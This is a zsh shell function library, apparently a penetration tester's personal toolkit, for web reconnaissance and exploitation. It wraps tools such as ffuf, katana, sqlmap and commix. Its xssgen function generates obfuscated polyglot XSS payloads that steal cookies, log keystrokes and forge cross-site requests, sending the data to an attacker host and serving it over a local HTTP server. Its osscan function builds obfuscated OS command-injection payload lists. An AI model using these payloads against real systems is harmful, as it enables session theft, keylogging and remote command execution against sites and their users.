# HTTP Tech Scanning function
techscan(){
    echo -e "------------TECHNOLOGY SCANNING \"$1\"----------------"
    host=$(echo $1 | unfurl format %d)
    port=$(echo $1 | unfurl format %P)

    echo -e "\nSERVER HEADER\n"
    curl -kIL $1

    echo -e "\nDEFAULT ALLOWED METHODS\n"
    curl -kILX OPTIONS $1

    if [[ $(echo $1 | unfurl format %s) == "https" ]]; then 
        if [[ -z $port ]]; then
            port=443
        fi
        echo -e "\nTESTING WITH SSLYZE / HEARTBLEED\n"
        sslyze $host:$port
        Heartbleed $1
    else
        if [[ -z $port ]]; then
            port=80
        fi
    fi

    echo -e "\nCHECKING WAF PRESENCE\n"
    wafme0w -t $1 --no-warning --concurrency 15

    echo -e "\nTECHNOLOGY SCANNING\n"
    whatweb -a 3 $1
}

crawl(){
    local target=$1
    local cookie=${2:-"rand=rand"}
    echo -e "------------------WEB CRAWLING----------------------\n"
    dom=$(echo $1 | unfurl format %d)
    is_ip=$(echo $dom | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
    if [[ -z $is_ip ]]; then
        root_dom=$(echo $dom | awk -F. '{print $(NF-1)"."$NF}')
    else
        root_dom=$dom
    fi

    echo -e "\nCRAWLING URL \"$1\" AT DEPTH 3...\n"
    katana -up &>/dev/null
    
    if [[ -n "$cookie" && "$cookie" != "rand=rand" ]]; then
        katana -u "$target" -H "Cookie: $cookie" -jc -jsl -kf all -aff -fx -td -xhr -j -or -nc -silent -do -cs "$dom" -o crawled_$dom.txt >/dev/null
    else
        katana -u "$target" -jc -jsl -kf all -aff -fx -td -xhr -j -or -nc -silent -do -cs "$dom" -o crawled_$dom.txt >/dev/null
    fi

    echo -e "\n[+] ENDPOINTS\n"
    cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "GET" and (.request.endpoint | test("[?&]") | not))' | jq '.request.endpoint' | tr -d '"' | grep "$root_dom" --color=never

    echo -e "\n[+] SUBDOMAINS\n"
    cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "GET" and (.request.endpoint | test("[?&]") | not))' | jq '.request.endpoint' | tr -d '"' | grep "$root_dom" --color=never | unfurl format %d | grep "$dom" -wxv --color=never | tee -a /tmp/crawled_$dom.txt
    cat crawled_$dom.txt | jq '.response.body' | grep -Po "\b[A-Za-z0-9][A-Za-z0-9.-]*\.$root_dom\b" --color=never | grep "$dom" -wxv --color=never | tee -a /tmp/crawled_$dom.txt
    cat /tmp/crawled_$dom.txt | sort -u

    echo -e "\n[+] GET QUERIES\n"
    cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq -s 'unique_by(.request.endpoint | sub("\\?.*"; "?"))' | jq 'map(select(.request.method == "GET" and (.request.endpoint | contains("?"))))' | jq 'map(.request.endpoint).[]' | tr -d '"' | grep "$root_dom" | qsreplace FUZZ

    echo -e "\n[+] ENDPOINTS WITH FORMS\n"
    cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "POST")' | jq 'map(.request.endpoint).[]'

    echo -e "\n[+] TECHNOLOGIES\n"
    cat crawled_$dom.txt | jq '.response.technologies' | jq -s 'add | unique' | jq '.[]'

    echo -e "\n[+] COMMENTS\n"
    cat crawled_$dom.txt | jq '.response.body' | grep -Po '<!-- \K.*?(?= -->)' | sort -u

    echo -e "\n[+] E_MAILS\n"
    cat crawled_$dom.txt | jq '.response.body' | stdbuf -oL grep -Eo "[A-Za-z0-9._%+-]+@$root_dom" | stdbuf -oL awk '!seen[$0]++'

    echo -e "\n[+] JS FILES\n"
    cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | grep "\.js" | awk '{print $2}' | tr -d '"' | anew /tmp/js_$dom.txt

    echo -e "\n[+] CHECKING SECRETS IN JS FILES"
    if [[ -f /tmp/js_$dom.txt && -s /tmp/js_$dom.txt ]]; then
        cat /tmp/js_$dom.txt | mantra -s
        rm /tmp/js_$dom.txt
    else
        echo "No JS files found to check"
    fi

    echo -e "\n[+] 404 LINK HIJACKING\n"
    blc -ro -f -i --filter-level 2 -g "$target" | grep -i HTTP_404
}

# Extension Selector Function
select_extension() {
  local options=(
    [1]='.php,.inc,.txt,.html'
    [2]='.asp,.aspx,.ashx,.asmx'
    [3]='.jsp,.java,.class,.do,.action,.war'
    [4]='.cgi,.pl,.bat,.sh,.cmd'
    [5]='.log,.txt,.json,.xml,.html,.js,.pcap'
    [6]='.pem,.scr.,.der,.cert,.key,.crt,.pfx'
    [7]='.bak,.old,.tmp,.env,.wadl,.git'
    [8]='.zip,.tar,.tar.gz,.gz,.7z,.rar,.bz2,.gzip,.sqlite,.sql,.db,.kbdx'
    [9]='.vhd,.vmdk,.vhdx,.img,.iso'
    [10]='.doc,.docx,.xls,.xlsx,.pdf,.ppt,.odt,.ost'
    [11]='.exe,.dll,.jar,.apk'
  )

  print -P "%F{blue}Select file extension group:%f"
  for k v in "${(@kv)options}"; do
    print -P "%F{green}$k)%f $v"
  done

  local choice
  while true; do
    read -r "choice?Enter your choice [1-${#options}]: "
    case $choice in
      [1-5])
        ext=$options[$choice]
        print -P "%F{green}Selected:%f $ext"
        return 0
        ;;
      6)
        read -r "ext?Enter custom extensions (comma-separated): "
        print -P "%F{green}Custom set:%f $ext"
        return 0
        ;;
      *)
        print -P "%F{red}Invalid selection! Please try again.%f"
        ;;
    esac
  done
}

# Extension Fuzzing
extfuzz(){
    select_extension
    echo -e "\n--------------------RECURSIVE EXTENSION FUZZING------------------\n"
    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -ac -acs advanced -r -ic -u $1/FUZZ -c -t 15 -w /home/damuna/wordlists/filenames.txt -e $ext

    echo -e "\n--------------------NON RECURSIVE EXTENSION FUZZING------------------\n"
    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -ac -acs advanced -ic -u $1/FUZZ -c -t 15 -w /home/damuna/wordlists/filenames.txt -e $ext 
}

# Directory Discovery
dirfuzz(){
    local target=$1
    local cookie=${2:-"rand=rand"}

    echo -e "-----------------NON RECURSIVE DIRECTORY FUZZING------------------\n"
    ffuf -H "Cookie: $cookie" -ac -acs advanced -mc all -ic -u $1/FUZZ -t 20 -c -w ~/wordlists/directories.txt
    
    echo -e "-----------------RECURSIVE DIRECTORY FUZZING------------------\n"
    ffuf -H "Cookie: $cookie" -ac -acs advanced -ic -mc all -r -u $1/FUZZ -c -t 20 -w ~/wordlists/directories.txt
}

#TMUX web scan
webenum() {
  read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
  if [[ -z $cookie ]]; then
    cookie="rand=rand"
  fi

  dom=$(openssl rand -hex 12)

  tmux new-session -d -s "$dom" -n "$1" "source ~/.zshrc; techscan $1; read"
  tmux split-window -h -t "$dom:0.0" "source ~/.zshrc; dirfuzz $1 $cookie; read"
  tmux split-window -h -t "$dom:0.1" "source ~/.zshrc; crawl $1 $cookie; read"
  tmux split-window -v -t "$dom:0.2" "source ~/.zshrc; extfuzz $1 $cookie; read"
  tmux select-layout -t "$dom" tiled
  tmux attach -t "$dom"
}


# Virtual Host discovery
vhost(){
    host=$(echo $1 | unfurl format %d)

    echo -e "\n-------------------CHECKING HOST MISROUTING\n"
    wd="/home/damuna/wordlists/vhosts.txt"
    
    ffuf -mc all -ac -acs advanced -u $1 -c -w "$wd:FUZZ" -H "Host: FUZZ.$host" "${@:2}"
}

# GET/POST/Header discovery
paramscan(){
    vared -p "INPUT THE WORDLIST for vhosts (leave empty to use burp-parameter): " -c wd
    if [[ -z $wd ]]; then
        wd=~/wordlists/parameters.txt
    fi
    read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
    if [[ -z $cookie ]]; then
        cookie="rand=rand"
    fi

    echo "\nX8 SEARCH (GET/POST)\n"    
    x8 -u $1 -H "Cookie: $cookie" -X GET POST -w $wd

    echo -e "\nX8 SEARCH (JSON)\n"
    x8 -u $1 -H "Cookie: $cookie" -X POST -w $wd -t json
}

# Wordpress Scanner
wordscan(){
    wpscan --api-token $wp_scan_api --url $1 --enumerate u,vp,vt,cb,dbe --rua --disable-tls-checks --no-banner -t 20
}

# SQL Injection Scanner
sqlscan(){
    echo -e "\nSCANNING REQUEST \"$1\" FOR SQL INJECTION WITH ALL METHODS\n"
    echo -e "----------------------------------"
    cat "$1"
    echo -e "----------------------------------"
    echo -n "Do you want to append '--smart' to sqlmap to test only if heuristics are positive? (y/n): "
    read choice
    case "$choice" in
        y|Y|yes|YES)
            sqlmap -r "$1" --level 5 --risk 3 --dbs --smart --privileges --threads=10 --technique=BESQUT --random-agent --batch --fingerprint --parse-errors --banner --flush-session --fresh-queries --tamper=between,space2comment
            ;;
        *)
            sqlmap -r "$1" --level 5 --risk 3 --dbs --privileges --threads=10 --technique=BESQUT --random-agent --batch --fingerprint --parse-errors --banner --flush-session --fresh-queries --tamper=between,space2comment,equaltolike
            ;;
    esac
}

# XSS Exploit generator using obfuscated polyglot
xssgen() {
    chnic
    read -r lport\?"[+] INPUT HTTP PORT: "

    echo -e "\n[+] COOKIE STEALING\n"
    b64_cookie=$(echo "fetch('http://$ip:$lport/?cookie='+btoa(document.cookie));" | base64 -w0)
    echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_cookie')) AuTOFOcus TabINDEx=1)//%0D%0A%0D0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_cookie')) AuTOFocus TaBIndeX=1//>\\\\x3e"
    echo -e "\n[+] SIMPLE PAYLOADS (Cookie Stealing):\n"
    echo "<img/src=x/onerror=eval(atob('$b64_cookie'))>"
    echo "<script/src=\"data:;base64,$b64_cookie\"></script>"
    echo "<svg/onload=eval(atob(\"$b64_cookie\"));>"
    echo -e "\n[+] KEY LOGGING\n"
    b64_key=$(echo "document.onkeypress=e=>fetch('http://$ip:$lport/?keystroke='+e.key)" | base64 -w0)
    echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_key')) AuTOFOcus TabINDEx=1)//%0D%0A%0D0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_key')) AuTOFocus TaBIndeX=1//>\\\\x3e"

    echo ""
    read -r req\?"[+] INPUT REQUEST FILE TO HIJACK VIA XHR (blank to skip): "
    read -r cross\?"[+] IS THE REQUEST CROSS-DOMAIN? (Y/N): "
    if [[ -f $req ]]; then
        method=$(head -n 1 $req | awk '{print $1}')
        pth=$(head -n 1 $req | awk '{print $2}')
        host=$(grep ^Host $req | awk '{print $2}')
        content_type=$(grep ^Content-Type $req | awk '{print $2}')
        post_data=$(awk 'BEGIN {p=0} /^$/ {p=1; next} p {printf "%s", $0}' $req | tr -d ' ')
        xhr_url="http://${host}${pth}"

        cross=""
        csrf=""
        if [[ $cross =~ [yY] ]]; then
            cross="x.withCredentials = true;"
            read -r csrf_url\?"[+] INPUT URL TO STEAL CSRF TOKEN (blank if none): "
            if [[ ! -z $csrf_url ]]; then
                read -r csrf_name\?"[+] INPUT NAME OF CSRF TOKEN: "
                csrf="x.open('GET','$csrf_url',false);x.send(null);regx = /${csrf_name}\" value=\"(.*)\"/g;token = regx.exec(x.responseText)[1];"
            fi
        fi

        if [[ $method == "GET" ]]; then
            b64_key=$(echo "var x=new XMLHttpRequest();${cross}x.onreadystatechange=function(){if(x.readyState==4)fetch(\"http://$ip:$port/?response\"+btoa(x.responseText))};x.open(\"$method\",\"$xhr_url\",false);x.send(null);")
        fi
        if [[ $method == "POST" ]]; then
            b64_key=$(echo "var x=new XMLHttpRequest();${cross}x.onreadystatechange=function(){if(x.readyState==4)fetch(\"http://$ip:$port/?response\"+btoa(x.responseText))};x.open(\"$method\",\"$xhr_url\",false);x.setRequestHeader('Content-type','$content_type');x.send('$post_data');")
        fi
        echo -e "----------------------------------"
        echo -e "$b64_key"
        echo -e "----------------------------------"
        echo -e "\n[+] XHR FORGERY\n"
        b64_xhr=$(echo $b64_key | base64 -w0)
        echo -e "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_xhr')) AuTOFOcus TabINDEx=1)//%0D%0A%0D0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_xhr')) AuTOFocus TaBIndeX=1//>\\\\x3e"
    fi

    echo -e "\n[+] OPENING HTTP SERVER ON \"http://$ip:$lport\"\n"
    python3 -m http.server $lport >/dev/null
}

# OS Injection Linux Fuzzer
osscan(){
    rm ./os_injection.txt
    read -r cmd\?"[+] INPUT COMMAND TO EXECUTE: "
    read -r regex\?"[+] INPUT RESPONSE CONFIRMATION STRING (BLANK IF BLIND): "

    bin=$(echo "$cmd" | awk '{print $1}')
    echo "rev" | sed 's/./&$()/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed 's/./&$@/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\'\'/1" >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\"\"/1" >> /tmp/rev_mangle.txt

    while read rev; do
        revstr="$rev<<<'$(echo "$cmd" | rev)'"
        echo "\$($revstr)" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\`$revstr\`" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < /tmp/rev_mangle.txt
    rm /tmp/rev_mangle.txt

    echo "xxd" | sed 's/./&$()/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed 's/./&$@/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\'\'/1" >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\"\"/1" >> /tmp/xxd_mangle.txt
    echo "\$(rev<<<xxd)" >> /tmp/xxd_mangle.txt
    while read xxd; do
        echo "\$($xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"'))" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\`$xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')\`" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "{$xxd,-r,-ps,<<<,$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')}" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < /tmp/xxd_mangle.txt
    rm /tmp/xxd_mangle.txt

    echo "$cmd" | sed 's/./&$()/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed 's/./&$@/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\'\'/1" >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\"\"/1" >> /tmp/cmd_mangle.txt
    while read cmdp; do
        echo "$cmdp" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\$($cmdp)" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "\`$cmdp\`" >> ~/wordlists/OS_INJECTION/payloads.txt
        echo "{$(echo $cmdp | sed -e "s/ /,/g")}" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < /tmp/cmd_mangle.txt
    rm /tmp/cmd_mangle.txt

    while read sp; do
        cat ~/wordlists/OS_INJECTION/payloads.txt | sed "s/ /$sp/g" >> ~/wordlists/OS_INJECTION/payloads.txt
    done < ~/wordlists/OS_INJECTION/spaces.txt
    cat ~/wordlists/OS_INJECTION/payloads.txt | sed -e "s/\//\$\{PATH:0:1\}/g" >> ~/wordlists/OS_INJECTION/payloads.txt

    while read sp; do
        while read sep; do
            while read payload; do
                echo "$sp$sep$sp$payload" >> os_injection.txt
                echo "$sp$sep$sp$payload$sp#" >> os_injection.txt
            done < ~/wordlists/OS_INJECTION/payloads.txt
        done < ~/wordlists/OS_INJECTION/separators.txt
    done < ~/wordlists/OS_INJECTION/spaces.txt
    rm ~/wordlists/OS_INJECTION/payloads.txt
    
    cat os_injection.txt | sort -u | shuf >t; mv t os_injection.txt
    if [[ ! -z $regex ]]; then
        echo -e "\n[+] FUZZING REQUEST \"$1\" AND MATCHING RESPONSE FOR \"$regex\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s -mr $regex
    else
        echo -e "\n[+] FUZZING REQUEST \"$1\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s
    fi

    echo -e "\n[+] TESTING REQUEST \"$1\" FOR OS INJECTION USING COMMIX"
    cur=$(pwd)
    cd /home/damuna/tools/commix
    python3 commix.py --update
    python3 commix.py -r $cur/$1 --flush-session --mobile --purge --current-user --level=3 --tamper=backslashes,backticks,base64encode,caret,dollaratsigns,doublequotes,multiplespaces,nested,printf2echo,randomcase,rev,singlequotes,slash2env,sleep2timeout,sleep2usleep,space2htab,space2ifs,space2plus,space2vtab
    cd $cur
}

# Fuzzing of a GET parameter
paramfuzz(){
    nuclei -u $1 -headless -dast
}

# Web Server Path Generator
generate_web_paths() {
    if [[ $# -eq 0 ]]; then
        echo "Usage: generate_web_paths <server_type> [domain] [output_file]"
        echo "Supported servers: apache, nginx, lighttpd, tomcat, iis, caddy, all"
        return 1
    fi
    
    local server_type="$1"
    local domain="${2:-}"
    local output_file="${3:-web_paths.txt}"
    
    > "$output_file"
    
    local bases=("/usr/local/etc" "/etc" "/opt" "/usr/local")
    
    case "$server_type" in
        apache)
            {
            local apache_dirs=("httpd" "apache" "apache2" "apache24")
            local main_configs=("httpd.conf" "apache2.conf" "ports.conf")
            local site_configs=("000-default.conf" "default.conf" "default-ssl.conf")
            
            if [[ -n "$domain" ]]; then
                site_configs+=("${domain}.conf" "ssl-${domain}.conf" "${domain}-ssl.conf" "vhost-${domain}.conf")
            fi
            
            for base in "${bases[@]}"; do
                for apache_dir in "${apache_dirs[@]}"; do
                    for config in "${main_configs[@]}"; do
                        echo "${base}/${apache_dir}/conf/${config}"
                        echo "${base}/${apache_dir}/${config}"
                    done
                    
                    echo "${base}/${apache_dir}/conf/vhosts/"
                    echo "${base}/${apache_dir}/conf/vhosts.d/"
                    echo "${base}/${apache_dir}/conf/extra/"
                    echo "${base}/${apache_dir}/conf/extra/httpd-vhosts.conf"
                    echo "${base}/${apache_dir}/vhosts/"
                    
                    for site_config in "${site_configs[@]}"; do
                        echo "${base}/${apache_dir}/conf/sites-enabled/${site_config}"
                        echo "${base}/${apache_dir}/conf/sites-available/${site_config}"
                        echo "${base}/${apache_dir}/sites-enabled/${site_config}"
                        echo "${base}/${apache_dir}/sites-available/${site_config}"
                    done
                    
                    if [[ -n "$domain" ]]; then
                        echo "${base}/${apache_dir}/logs/access_log"
                        echo "${base}/${apache_dir}/logs/error_log"
                        echo "/var/log/${apache_dir}/access.log"
                        echo "/var/log/${apache_dir}/error.log"
                    fi
                done
            done
            
            echo "/var/www/html/"
            if [[ -n "$domain" ]]; then
                echo "/var/www/${domain}/"
                echo "/home/*/public_html/${domain}/"
            else
                echo "/var/www/"
            fi
            echo "/srv/http/"
            echo "/home/*/public_html/"
            } >> "$output_file"
            ;;
        
        nginx)
            {
            local main_configs=("nginx.conf")
            local site_configs=("default" "default.conf" "default_ssl")
            
            if [[ -n "$domain" ]]; then
                site_configs+=("${domain}" "${domain}.conf" "ssl-${domain}.conf" "${domain}-le-ssl.conf")
            fi
            
            for base in "${bases[@]}"; do
                for config in "${main_configs[@]}"; do
                    echo "${base}/nginx/${config}"
                    echo "${base}/nginx/conf/${config}"
                done
                
                echo "${base}/nginx/conf.d/"
                echo "${base}/nginx/vhosts/"
                
                for site_config in "${site_configs[@]}"; do
                    echo "${base}/nginx/sites-enabled/${site_config}"
                    echo "${base}/nginx/sites-available/${site_config}"
                    echo "${base}/nginx/conf.d/${site_config}"
                    echo "${base}/nginx/vhosts/${site_config}"
                done
            done
            
            echo "/opt/nginx/conf/nginx.conf"
            echo "/opt/nginx/conf.d/"
            if [[ -n "$domain" ]]; then
                echo "/var/log/nginx/${domain}.access.log"
                echo "/var/log/nginx/${domain}.error.log"
                echo "/var/www/${domain}/"
            else
                echo "/var/log/nginx/access.log"
                echo "/var/log/nginx/error.log"
            fi
            echo "/usr/share/nginx/html/"
            echo "/srv/http/"
            } >> "$output_file"
            ;;
        
        lighttpd)
            {
            local lighttpd_configs=("lighttpd.conf")
            local vhost_configs=("simple-vhost.conf" "evhost.conf")
            
            if [[ -n "$domain" ]]; then
                vhost_configs+=("${domain}.conf")
            fi
            
            for base in "${bases[@]}"; do
                for config in "${lighttpd_configs[@]}"; do
                    echo "${base}/lighttpd/${config}"
                    echo "${base}/lighttpd/conf-available/${config}"
                done
                
                for vhost_config in "${vhost_configs[@]}"; do
                    echo "${base}/lighttpd/conf-available/${vhost_config}"
                    echo "${base}/lighttpd/conf-enabled/${vhost_config}"
                    echo "${base}/lighttpd/vhosts/${vhost_config}"
                done
                
                echo "${base}/lighttpd/vhosts.d/"
            done
            
            if [[ -n "$domain" ]]; then
                echo "/var/log/lighttpd/${domain}.access.log"
                echo "/var/www/${domain}/"
            else
                echo "/var/log/lighttpd/access.log"
                echo "/var/www/"
            fi
            echo "/srv/http/"
            } >> "$output_file"
            ;;
        
        tomcat)
            {
            local tomcat_dirs=("tomcat" "tomcat9" "tomcat8" "tomcat7" "tomcat85")
            local tomcat_configs=("server.xml" "web.xml" "context.xml")
            
            for base in "${bases[@]}"; do
                for tomcat_dir in "${tomcat_dirs[@]}"; do
                    for config in "${tomcat_configs[@]}"; do
                        echo "${base}/${tomcat_dir}/${config}"
                        echo "${base}/${tomcat_dir}/conf/${config}"
                    done
                    
                    echo "${base}/${tomcat_dir}/conf/Catalina/"
                    echo "${base}/${tomcat_dir}/conf/Catalina/localhost/"
                    echo "${base}/${tomcat_dir}/webapps/"
                    
                    if [[ -n "$domain" ]]; then
                        echo "${base}/${tomcat_dir}/conf/Catalina/localhost/${domain}.xml"
                        echo "${base}/${tomcat_dir}/webapps/${domain}/"
                        echo "${base}/${tomcat_dir}/webapps/${domain}/WEB-INF/web.xml"
                        echo "${base}/${tomcat_dir}/logs/${domain}.log"
                    else
                        echo "${base}/${tomcat_dir}/conf/Catalina/localhost/"
                        echo "${base}/${tomcat_dir}/webapps/"
                    fi
                done
            done
            
            echo "/opt/tomcat/conf/server.xml"
            if [[ -n "$domain" ]]; then
                echo "/var/log/tomcat*/${domain}.log"
            else
                echo "/var/log/tomcat*/catalina.out"
            fi
            echo "/var/lib/tomcat*/webapps/"
            } >> "$output_file"
            ;;
        
        iis)
            {
            echo "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"
            echo "C:\\Windows\\System32\\inetsrv\\config\\schema\\"
            echo "C:\\inetpub\\wwwroot\\web.config"
            echo "C:\\inetpub\\logs\\LogFiles\\"
            
            if [[ -n "$domain" ]]; then
                echo "C:\\inetpub\\vhosts\\${domain}\\"
                echo "C:\\inetpub\\vhosts\\${domain}\\web.config"
                echo "C:\\inetpub\\wwwroot\\${domain}\\"
                echo "C:\\inetpub\\wwwroot\\${domain}\\web.config"
                echo "C:\\inetpub\\logs\\LogFiles\\W3SVC*\\${domain}.log"
            else
                echo "C:\\inetpub\\vhosts\\"
                echo "C:\\inetpub\\wwwroot\\"
            fi
            
            echo "C:\\Users\\*\\Documents\\IISExpress\\config\\applicationhost.config"
            } >> "$output_file"
            ;;
        
        caddy)
            {
            local caddy_configs=("Caddyfile")
            
            if [[ -n "$domain" ]]; then
                caddy_configs+=("${domain}.conf" "${domain}.caddy")
            fi
            
            for base in "${bases[@]}"; do
                for config in "${caddy_configs[@]}"; do
                    echo "${base}/caddy/${config}"
                    echo "${base}/caddy/conf.d/${config}"
                    echo "${base}/caddy/sites-enabled/${config}"
                    echo "${base}/caddy/sites-available/${config}"
                done
                echo "${base}/caddy/vhosts/"
            done
            
            echo "/opt/caddy/Caddyfile"
            echo "/home/caddy/Caddyfile"
            if [[ -n "$domain" ]]; then
                echo "/var/log/caddy/${domain}.log"
                echo "/var/www/${domain}/"
            else
                echo "/var/log/caddy/access.log"
            fi
            } >> "$output_file"
            ;;
        
        all)
            {
            echo "# General Web Server Discovery Paths"
            echo "/var/www/html/"
            echo "/var/www/"
            echo "/srv/http/"
            echo "/usr/share/nginx/html/"
            echo "/usr/local/www/"
            echo "/home/*/public_html/"
            echo "/home/*/www/"
            echo "/etc/httpd/"
            echo "/etc/apache2/"
            echo "/etc/nginx/"
            echo "/etc/lighttpd/"
            echo "/etc/tomcat*/"
            
            if [[ -n "$domain" ]]; then
                echo "/var/www/${domain}/"
                echo "/home/*/public_html/${domain}/"
                echo "/var/log/apache2/${domain}.log"
                echo "/var/log/nginx/${domain}.log"
                echo "/etc/letsencrypt/live/${domain}/"
                echo "/etc/ssl/certs/${domain}.crt"
                echo "/etc/ssl/private/${domain}.key"
            else
                echo "/var/log/apache2/"
                echo "/var/log/nginx/"
                echo "/etc/letsencrypt/live/"
            fi
            } >> "$output_file"
            
            local servers=("apache" "nginx" "lighttpd" "tomcat" "caddy")
            for server in "${servers[@]}"; do
                local temp_file=$(mktemp)
                generate_web_paths "$server" "$domain" "$temp_file"
                cat "$temp_file" >> "$output_file"
                rm -f "$temp_file"
            done
            ;;
        
        *)
            echo "Error: Unsupported server type '$server_type'" >&2
            echo "Supported servers: apache, nginx, lighttpd, tomcat, iis, caddy, all" >&2
            return 1
            ;;
    esac
    
    local line_count=$(wc -l < "$output_file" 2>/dev/null || echo "0")
    echo "Generated $line_count paths in: $output_file"
}

